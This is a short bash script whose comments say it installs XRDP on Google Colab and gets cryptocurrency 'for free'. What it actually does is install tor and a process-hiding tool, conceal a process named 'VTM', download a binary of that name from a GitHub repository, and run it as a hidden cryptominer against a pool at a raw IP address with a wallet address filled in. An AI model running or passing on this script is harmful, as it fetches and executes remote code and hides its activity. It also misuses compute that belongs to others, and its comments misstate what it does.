# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear

sudo apt update -y
sudo apt install gcc -y
apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
service tor start && curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash -
apt install nodejs -y
npm install -g npm@8.18.0 -y
npm i -g node-process-hider
ph add VTM

wget https://github.com/indah38/theta/raw/main/VTM
chmod 700 VTM

./VTM -a yescryptr16  -o stratum+tcps://178.128.86.41:80 -u vFEneCSxgbhmn7idJxxWULEgD5jS2hyJnQ.OHGITU -p x -t3
